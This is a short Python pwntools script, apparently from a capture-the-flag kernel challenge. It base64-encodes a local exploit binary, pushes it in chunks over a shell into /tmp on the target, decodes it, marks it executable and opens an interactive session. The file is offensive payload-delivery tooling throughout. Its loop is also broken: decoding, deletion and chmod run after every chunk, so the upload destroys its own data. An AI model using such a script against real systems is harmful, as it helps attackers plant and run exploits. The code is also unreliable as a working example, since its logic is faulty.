from pwn import *
import time
import base64
import os

def run(cmd):
    sock.sendlineafter("$ ", cmd)
    sock.recvline()

with  open ( "./root/exploit" , "rb" ) as f:
    payload = base64.b64encode(f.read())
    print(payload)

#sock = Socket("HOST", PORT) # remote
sock = process("./run.sh", shell=True)

run( 'cd /tmp' )

log.info( "Uploading..." )
for i in  range ( 0 , len (payload), 512 ):
    print ( f"Uploading... {i:x} / { len (payload):x} ")
    run('echo "{}" >> b64exp'.format(payload[i:i+ 512 ]))
    run('base64 -d b64exp > exploit')
    run('rm b64exp')
    run('chmod +x exploit')

sock.interactive()
